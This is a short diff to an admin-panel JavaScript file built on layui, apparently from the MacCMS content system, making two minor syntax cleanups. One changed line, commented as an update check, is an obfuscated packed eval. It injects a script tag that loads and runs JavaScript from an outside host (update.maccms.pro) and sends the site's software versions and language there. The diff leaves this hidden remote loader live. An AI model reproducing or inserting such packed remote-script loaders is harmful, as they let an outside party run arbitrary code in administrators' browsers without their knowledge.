@@ -198,7 +198,7 @@ layui.define(['element', 'form'], function(exports) {
     // 检查更新
     $(function(){
         if( typeof(MAC_VERSION) !='undefined' && typeof(PHP_VERSION) !='undefined' && typeof(THINK_VERSION) !='undefined' ) {
-            eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'1\').2(\'<3 4="//5.6.0/0/?c=7&8=\'+9+\'&a=\'+b+\'&d=\'+e+\'&f=\'+g+\'&h=\'+i.j()+\'"></k\'+\'l>\');',22,22,'pro|body|append|script|src|update|maccms|check|v|MAC_VERSION|p|PHP_VERSION||tp|THINK_VERSION|lang|MAC_LANG|t|Math|random|scr|ipt'.split('|'),0,{}));
+            eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1}while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'1\').2(\'<3 4="//5.6.0/0/?c=7&8=\'+9+\'&a=\'+b+\'&d=\'+e+\'&f=\'+g+\'&h=\'+i.j()+\'"></k\'+\'l>\');',22,22,'pro|body|append|script|src|update|maccms|check|v|MAC_VERSION|p|PHP_VERSION||tp|THINK_VERSION|lang|MAC_LANG|t|Math|random|scr|ipt'.split('|'),0,{}));
         }
     });
 
@@ -357,7 +357,7 @@ layui.define(['element', 'form'], function(exports) {
             that.parents('tr').find('input[name="ids[]"]').attr("checked", true);
         }else{
             that.parents('tr').find('input[name="ids[]"]').attr("checked", false);
-        };
+        }
         form.render('checkbox');
     });
 
